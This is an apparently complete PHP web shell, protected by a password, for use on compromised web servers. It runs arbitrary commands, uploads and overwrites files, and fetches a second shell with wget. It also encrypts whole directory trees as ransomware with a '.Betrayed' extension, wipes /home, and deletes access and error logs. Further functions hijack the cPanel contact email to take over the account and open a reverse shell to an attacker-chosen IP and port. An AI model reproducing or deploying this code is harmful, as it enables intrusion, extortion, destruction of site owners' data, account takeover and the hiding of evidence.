<?php

error_reporting(0);
set_time_limit (0);
ini_set('display_errors', 'Off');

session_start();

$auth = "f9df3cfba3a4b5cf072d303b89b02670ce846724c787ae9278518e433b96d918";


function getUserIpAddr(){
    if(!empty($_SERVER['HTTP_CLIENT_IP'])){
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    }elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }else{
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}


if(!isset($_SESSION["auth"]) && isset($_POST["auth"])){
    $postauth = str_replace("\n","",$_POST["auth"]);
    if(isset($postauth) && isset($auth) && hash('sha256', $postauth) == $auth) {
        $_SESSION['auth'] = $postauth;
        $soft = $_SERVER['SERVER_SOFTWARE'];
        if (startsWith($soft,"LiteSpeed")){
            echo $soft . " " .  file_get_contents('/usr/local/lsws/VERSION');
        }
        elseif(startsWith($soft,"Apache")){
            if(!function_exists('apache_get_version')){
                function apache_get_version(){
                    if(!isset($_SERVER['SERVER_SOFTWARE']) || strlen($_SERVER['SERVER_SOFTWARE']) == 0){
                        return false;
                    }
                    return $_SERVER["SERVER_SOFTWARE"];
                }
            }
            echo apache_get_version() . "\n";
        }
        else{
            echo $soft;
        }

        echo php_uname(). "\n";
        if(isset($_SERVER['SERVER_ADDR'])){
            echo "Server ip > ".$_SERVER['SERVER_ADDR']. "\n";
        }
        echo "Your ip > " . getUserIpAddr() . "\n";
        echo "Current user > " . get_current_user(). "\n";
        echo "OS > " . PHP_OS . "\n";
        chechx("id");
        $disabled_functions = ini_get('disable_functions');
        if ($disabled_functions!='')
        {
        $arr = explode(',', $disabled_functions);
        sort($arr);
        echo 'Disabled Functions: ';
        for ($i=0; $i<count($arr); $i++)
        {
        echo ' > '.$arr[$i];
        }
        }
        else
        {
        echo 'No functions disabled';
        }

        if(function_exists('mcrypt_encrypt')) {
            $check = "YES!";
            echo "\nThis website can be Encrypted! :) ";
            echo "\n".getcwd();
        } else {
            $check = "NO!";
            echo "\nSORRY this website can't be Encrypted! :( ";
            echo "\n".getcwd();
        }
    }
    else{
        echo "wrong password!!! ";
        echo "\n";
        exit();

}

}

function chechx($commnd){
    if(function_exists("system")){
        system($commnd). "\n";
    }
    elseif(function_exists("exec")){
        exec($commnd). "\n";
    }
    elseif(function_exists("shell_exec")){
        shell_exec($commnd). "\n";
    }
    elseif(function_exists("passthru")){
        passthru($commnd);
    }

}

function startsWith ($string, $startString)
{ 
    $len = strlen($startString); 
    return (substr($string, 0, $len) === $startString); 
} 

function setses(){
    $_SESSION["path"] = getcwd();
}





if(isset($_POST["path"]) && isset($_SESSION["auth"])){
    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
        $sym = "\\";
    }
    else{
        $sym = "/";
    }
    $path = $_POST["path"];
    $Dot = "..";
    $pos = strpos($path, $Dot);
    if(!isset($_SESSION["path"])){
    $_SESSION["path"] = getcwd();
    }
    else{
        if(startsWith($path, $sym)){
            if ($pos !== false){
                $rem = explode($sym, $_SESSION["path"]);
                $rer = array_pop($rem);
                $rer = array_diff($rem, array($rer));
                $_SESSION["path"] = implode($sym,$rer);
                chdir($_SESSION["path"]);
                echo "\n".getcwd();
            }
            elseif($pos === false && isset($path)){
                $path = str_replace("\n","",$path);
                $rem = explode($sym, $_SESSION["path"]);
                array_push($rem, $path);
                $_SESSION["path"] = implode($sym,$rem);
                if(chdir($_SESSION["path"])){
                    echo "\n".getcwd();
                }
                else{
                    $rem = explode($sym, $_SESSION["path"]);
                    $rer = array_pop($rem);
                    $rer = array_diff($rem, array($rer));
                    $_SESSION["path"] = implode($sym,$rer);
                    chdir($_SESSION["path"]);
                    echo "\n".getcwd();
                }
            }

        }
        else{
            if($pos !== false){
                $rem = explode($sym, $_SESSION["path"]);
                $rer = array_pop($rem);
                $rer = array_diff($rem, array($rer));
                $_SESSION["path"] = implode($sym,$rer);
                chdir($_SESSION["path"]);
                echo "\n".getcwd();
            }
            elseif($pos === false && isset($path)){
                $path = str_replace("\n","",$path);
                $rem = explode($sym, $_SESSION["path"]);
                array_push($rem, $path);
                $_SESSION["path"] = implode($sym, $rem);
                if(chdir($_SESSION["path"])){
                    echo "\n".getcwd();
                }
                else{
                    $rem = explode($sym, $_SESSION["path"]);
                    $rer = array_pop($rem);
                    $rer = array_diff($rem, array($rer));
                    $_SESSION["path"] = implode($sym,$rer);
                    chdir($_SESSION["path"]);
                    echo "\n".getcwd();
                }
                
            }
        }

    }
}
else{
    
}


function clearerror(){
    if(function_exists("system")) {
        system("find /home -name 'error_log'  -exec rm {} \;");
        echo "\n".getcwd();
    }
    elseif(function_exists("shell_exec")){
        $out = shell_exec("find /home -name 'error_log'  -exec rm {} \;");
        echo $out;
        echo "\n".getcwd();
    }
    elseif(function_exists("exec")){
        $new = exec("find /home -name 'error_log'  -exec rm {} \;");
        echo $new;
        echo "\n".getcwd();
    }
}


if(isset($_POST["zx"]) && isset($_SESSION["auth"])){
    if(isset($_SESSION["path"])){
        chdir($_SESSION["path"]);
        runner($_POST["zx"]);
    }
    else{
        setses();
        chdir($_SESSION["path"]);
        runner($_POST["zx"]);
    }

}
if(isset($_POST["key"]) && isset($_SESSION["auth"])){
    clearerror();
    $key = $_POST["key"];
    $drx = $_POST["dir"];
    $secret_key = str_replace("\n","",$key);
    $dir = str_replace("\n","",$drx);
    encx($secret_key,$dir);
}

if(isset($_POST["dekey"]) && isset($_SESSION["auth"])){
    clearerror();
    $key = $_POST["dekey"];
    $drx = $_POST["dir"];
    $secret_key = str_replace("\n","",$key);
    $dir = str_replace("\n","",$drx);
    dcry($secret_key,$dir);
}


if(isset($_POST["fuckedserver"]) && isset($_SESSION["auth"])){
    funk("/home");
}

function runner($command){
        if ($command == "mahakal") {
            system("wget https://raw.githubusercontent.com/Anon-Exploiter/Mini-Shell/master/mini_shell.php");
        }
        else {
            $ex = $command;
            if(function_exists("system")) {
                system($ex);
                echo "\n".getcwd();
            }
            elseif(function_exists("shell_exec")){
                $out = shell_exec($ex);
                echo $out;
                echo "\n".getcwd();
            }
            elseif(function_exists("exec")){
                $new = exec($ex);
                echo $new;
                echo "\n".getcwd();
            }
            elseif(function_exists("passthru")){
                echo passthru($ex);
                echo "\n" . getcwd();
            }
        
            
        }
}


function enc($key,$lol){
    if($lol != (__FILE__)){
        if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
            $dir_path = dirname(__FILE__)."\\";
        }
        else{
            $dir_path = dirname(__FILE__)."/";
        }
        $path_file = pathinfo(__FILE__);
        $path_file = $dir_path.$path_file['basename'];
        $path_info = pathinfo($lol);
        if (isset($path_info["extension"]) && $path_info["extension"] == "Betrayed"){
            echo "Already encrypted > " . $lol . "\n";

        }
        else {
            if($lol != $path_file){
                AES_CBC::encryptFile($key, $lol, $lol . '.Betrayed');
                unlink($lol) or die("Couldn't delete file");
                echo "Betrayed > " . $lol . "\n";
            }
            else{
                echo "Lovely me > " . $lol;
            }
        }

    }

}

function decryz($key,$lol){
    if($lol != (__FILE__)){
        $path_info = pathinfo($lol);
        if (isset($path_info["extension"]) && $path_info["extension"] == "Betrayed"){
            $out = substr($lol, 0, -9);
            AES_CBC::decryptFile($key, $lol, $out);
            unlink($lol) or die("Couldn't delete file");
            echo "Decrypted > " . $lol . "\n";
        }
        else {
          
        }
  
      }
}


if (isset($_FILES["file"]) && isset($_SESSION["auth"])){
    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
        $target_path = dirname(__FILE__)."\\";
    }
    else{
        $target_path = dirname(__FILE__)."/";
    }
    $target_path = $target_path.basename($_FILES['file']['name']);
    
    if(move_uploaded_file($_FILES['file']['tmp_name'], $target_path)) {  
        echo "File uploaded successfully here >>> " .$target_path ;
        echo "\n".getcwd();

    } else{  
        echo "Sorry, file not uploaded, please try again!";
        echo "\n".getcwd();

    }  
}


   
function encx($secret_key,$dir){
    foreach( new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS)) as $filename){
        #echo $filename;
        enc($secret_key,$filename);
    }
}

function dcry($secret_key,$dir){
    foreach( new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS)) as $filename){
        #echo $filename;
        decryz($secret_key,$filename);
    }
}

function funk($dir){
    foreach( new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS)) as $filename){
        #echo $filename;
        try{
            unlink($filename) or die("Couldn't delete file");
            echo "Fucked> ". $filename;
        }
        catch(Exception $e){
            echo "Permission denial" . $filename; 
        }

    }
    
}


if(isset($_POST["logfucked"]) && isset($_SESSION["auth"])){
    clearerror();
    try{
        system("find /home -name 'access_log'  -exec rm {} \;");
        system("find /home -name 'error_log'  -exec rm {} \;");
    }
    catch(Exception $e){
        echo $e;
    }

}


if(isset($_POST["creckcpanel"]) && isset($_SESSION["auth"])){
    checkcreckcpanel();
    system("find .my.cnf");
}

    

function checkcreckcpanel(){
    try{
        $paap = "/"."home"."/" . get_current_user() . "/";
        echo ("current email used in cpanel > ");
        echo file_get_contents($paap . ".contactemail");
        $locky = $paap . ".cpanel/contactinfo";
        if(file_exists($locky)){
            unlink($locky) or die(" access denied! for " . $locky);
        }
        echo "\nThis website Cpanel can Be crecked Type creckzee \n";
    }
    catch(Exception $e){
        echo "Cpanel can't be creck " . $e;
    }

}


if(isset($_POST["creckzee"]) && isset($_SESSION["auth"])){
    $em = $_POST["creckzee"];
    $me = str_replace("\n","",$em);
    creckzee($me);
}

if(isset($_POST["replace"]) && isset($_SESSION["auth"])){
    try{
        $path = $_POST["path"];
        $content = $_POST["content"];
        file_put_contents($path,$content);
        echo 'Done ! :)';
    }
    catch(Exception $e){
            echo "NoT writtable " . $e;
    }
}

if(isset($_POST["backconnect"]) && isset($_SESSION["auth"])){
    try{
        $ip = str_replace("\n","",$_POST["ip"]);
        $port = str_replace("\n","",$_POST["port"]);
        echo $ip;
        echo $port;
        $VERSION = "1.0";
        $chunk_size = 1400;
        $write_a = null;
        $error_a = null;
        $shell = 'uname -a; w; id; /bin/sh -i';
        $daemon = 0;
        $debug = 0;


        if (function_exists('pcntl_fork')) {

            $pid = pcntl_fork();
            
            if ($pid == -1) {
                printit("ERROR: Can't fork");
                exit(1);
            }
            
            if ($pid) {
                exit(0); 
            }


            if (posix_setsid() == -1) {
                printit("Error: Can't setsid()");
                exit(1);
            }

            $daemon = 1;
        } else {
            printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
        }


        chdir("/");


        umask(0);

        $sock = fsockopen($ip, $port, $errno, $errstr, 30);
        if (!$sock) {
            printit("$errstr ($errno)");
            exit(1);
        }

        $descriptorspec = array(
        0 => array("pipe", "r"), 
        1 => array("pipe", "w"), 
        2 => array("pipe", "w")   
        );

        $process = proc_open($shell, $descriptorspec, $pipes);

        if (!is_resource($process)) {
            printit("ERROR: Can't spawn shell");
            exit(1);
        }


        stream_set_blocking($pipes[0], 0);
        stream_set_blocking($pipes[1], 0);
        stream_set_blocking($pipes[2], 0);
        stream_set_blocking($sock, 0);

        printit("Successfully opened reverse shell to $ip:$port");

        while (1) {

            if (feof($sock)) {
                printit("ERROR: Shell connection terminated");
                break;
            }


            if (feof($pipes[1])) {
                printit("ERROR: Shell process terminated");
                break;
            }

            $read_a = array($sock, $pipes[1], $pipes[2]);
            $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

            if (in_array($sock, $read_a)) {
                if ($debug) printit("SOCK READ");
                $input = fread($sock, $chunk_size);
                if ($debug) printit("SOCK: $input");
                fwrite($pipes[0], $input);
            }

            if (in_array($pipes[1], $read_a)) {
                if ($debug) printit("STDOUT READ");
                $input = fread($pipes[1], $chunk_size);
                if ($debug) printit("STDOUT: $input");
                fwrite($sock, $input);
            }

            if (in_array($pipes[2], $read_a)) {
                if ($debug) printit("STDERR READ");
                $input = fread($pipes[2], $chunk_size);
                if ($debug) printit("STDERR: $input");
                fwrite($sock, $input);
            }
        }

        fclose($sock);
        fclose($pipes[0]);
        fclose($pipes[1]);
        fclose($pipes[2]);
        proc_close($process);
        echo 'Done ! :)';
    }
    catch(Exception $e){
            echo  $e;
    }
}

function creckzee($email){
    try{
        $paap = "/"."home"."/" . get_current_user() . "/";
        echo file_get_contents($paap . ".contactemail");
        $file = fopen($paap . ".contactemail","w");
        fwrite($file, $email);
        fclose($file);
        $locky = $paap . ".cpanel/contactinfo";
        if(file_exists($locky)){
            unlink($locky) or die(" access denied! for " . $locky);
        }
        echo "\nEnter your password in password reset field and reset the password :) ";
    }
    catch(Exception $e){
        echo $e;
    }

}

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}


class AES_CBC
{
   protected static $KEY_SIZES = array('AES-128'=>16,'AES-192'=>24,'AES-256'=>32);
   protected static function key_size() { return self::$KEY_SIZES['AES-128']; }
   public static function encryptFile($password, $input_stream, $aes_filename){
      $iv_size = mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC);
      $fin = fopen($input_stream, "rb");
      $fc = fopen($aes_filename, "wb+");
      if (!empty($fin) && !empty($fc)) {
         fwrite($fc, str_repeat("_", 32) );
         fwrite($fc, $hmac_salt = mcrypt_create_iv($iv_size, MCRYPT_DEV_URANDOM));
         fwrite($fc, $esalt = mcrypt_create_iv($iv_size, MCRYPT_DEV_URANDOM));
         fwrite($fc, $iv = mcrypt_create_iv($iv_size, MCRYPT_DEV_URANDOM));
         $ekey = hash_pbkdf2("sha256", $password, $esalt, $it=1000, self::key_size(), $raw=true);
         $opts = array('mode'=>'cbc', 'iv'=>$iv, 'key'=>$ekey);
         stream_filter_append($fc, 'mcrypt.rijndael-128', STREAM_FILTER_WRITE, $opts);
         $infilesize = 0;
         while (!feof($fin)) {
            $block = fread($fin, 8192);
            $infilesize+=strlen($block);
            fwrite($fc, $block);
         }
         $block_size = mcrypt_get_block_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC);
         $padding = $block_size - ($infilesize % $block_size);
         fwrite($fc, str_repeat(chr($padding), $padding) );
         fclose($fin);
         fclose($fc);
         $hmac_raw = self::calculate_hmac_after_32bytes($password, $hmac_salt, $aes_filename);
         $fc = fopen($aes_filename, "rb+");
         fwrite($fc, $hmac_raw);
         fclose($fc);
      }
   }


   public static function decryptFile($password, $aes_filename, $out_stream) {
    $iv_size = mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC);
    $hmac_raw = file_get_contents($aes_filename, false, NULL,  0, 32);
    $hmac_salt = file_get_contents($aes_filename, false, NULL, 32, $iv_size);
    $hmac_calc = self::calculate_hmac_after_32bytes($password, $hmac_salt, $aes_filename);
    $fc = fopen($aes_filename, "rb");
    $fout = fopen($out_stream, 'wb');
    if (!empty($fout) && !empty($fc) && self::hash_equals($hmac_raw,$hmac_calc)) {
       fread($fc, 32+$iv_size);
       $esalt = fread($fc, $iv_size);
       $iv    = fread($fc, $iv_size);
       $ekey = hash_pbkdf2("sha256", $password, $esalt, $it=1000, self::key_size(), $raw=true);
       $opts = array('mode'=>'cbc', 'iv'=>$iv, 'key'=>$ekey);
       stream_filter_append($fc, 'mdecrypt.rijndael-128', STREAM_FILTER_READ, $opts);
       while (!feof($fc)) {
          $block = fread($fc, 8192);
          if (feof($fc)) {
             $padding = ord($block[strlen($block) - 1]);
             $block = substr($block, 0, 0-$padding);
          }
          fwrite($fout, $block);
       }
       fclose($fout);
       fclose($fc);
    }
 }
 private static function hash_equals($str1, $str2) {
    if(strlen($str1) == strlen($str2)) {
       $res = $str1 ^ $str2;
       for($ret=0,$i = strlen($res) - 1; $i >= 0; $i--) $ret |= ord($res[$i]);
       return !$ret;
    }
    return false;
 }

   private static function calculate_hmac_after_32bytes($password, $hsalt, $filename) {
      static $init=0;
      $init or $init = stream_filter_register("user-filter.skipfirst32bytes", "FileSkip32Bytes");
      $stream = 'php://filter/read=user-filter.skipfirst32bytes/resource=' . $filename;
      $hkey = hash_pbkdf2("sha256", $password, $hsalt, $iterations=1000, 24, $raw=true);
      return hash_hmac_file('sha256', $stream, $hkey, $raw=true);
   }
}
class FileSkip32Bytes extends php_user_filter
{
   private $skipped=0;
   function filter($in, $out, &$consumed, $closing)  {
      while ($bucket = stream_bucket_make_writeable($in)) {
         $outlen = $bucket->datalen;
         if ($this->skipped<32){
            $outlen = min($bucket->datalen,32-$this->skipped);
            $bucket->data = substr($bucket->data, $outlen);
            $bucket->datalen = $bucket->datalen-$outlen;
            $this->skipped+=$outlen;
         }
         $consumed += $outlen;
         stream_bucket_append($out, $bucket);
      }
      return PSFS_PASS_ON;
   }
}
class AES_128_CBC extends AES_CBC {
   protected static function key_size() { return self::$KEY_SIZES['AES-128']; }
}
class AES_192_CBC extends AES_CBC {
   protected static function key_size() { return self::$KEY_SIZES['AES-192']; }
}
class AES_256_CBC extends AES_CBC {
   protected static function key_size() { return self::$KEY_SIZES['AES-256']; }
}
